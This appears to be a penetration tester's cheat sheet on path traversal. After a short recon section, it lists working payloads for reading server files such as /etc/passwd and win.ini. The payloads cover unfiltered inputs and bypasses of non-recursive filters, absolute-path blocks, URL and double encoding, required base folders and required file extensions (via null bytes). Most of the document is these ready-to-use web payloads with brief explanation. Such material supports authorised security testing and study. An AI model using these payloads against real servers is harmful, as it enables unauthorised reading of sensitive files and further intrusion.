![[Path Traversal.png]]
# Recon

Identify any app functionality that is likely to involve retrieval of data from a server's filesystem. Look for any input fields that reference a file or directory name, or that contain any file extensions such as:

```html
?file=test
?item=test.html
```

After identifying potential targets for path traversal testing, you must test every instance individually to determine if user controllable data is used to interact with the server filesystem in an unsafe way.
# No Defenses - Basic Example

The following is a basic payload that can be used to test for path traversal vulnerabilities when the app does not implement any input validation. This payload will step up 3 directories to reach the filesystem root, then reference another common file depending on the OS in use:

```bash
../../../etc/passwd
../../../windows/win.ini
```

>[!info]
>Many apps that place user input in file paths implement some defence against traversal attacks.
# Non-Recursive Filtering Bypass

The app may be filtering out the `../` characters, but not in a recursive manner:

```bash
....//....//....//etc/passwd
..././..././..././etc/passwd
```
# Absolute Path Bypass

This payload references the file directly without the use of the traversal sequences:

```bash
/etc/passwd
```
# Encoding Bypass

Try double URL encoding the following payload:

```bash
../../../etc/passwd
```

Other variations could be encoding only the `/` character in `../`:

```bash
..%25%32%66
```

URL encode the `/` character `..%2f` then URL encode only the `%` character in `..%2f`:

```bash
..%252f
```

>[!info]
>Burp Pro includes a path traversal fuzzing wordlist that has many variations of encoding sequences to use.
# Validation of Starting Path Bypass

Sometimes, the app requires that the supplied filename begins with a base folder. You can include this base folder and add in the traversal sequences after it:

```bash
/var/www/images/../../../etc/passwd
```
# File Extension Validation Bypass

If the app requires that the filename must end with a certain file extension, you can inject a null byte to possible terminate the file path before the required extension:

```bash
../../../etc/passwd%00.png
```

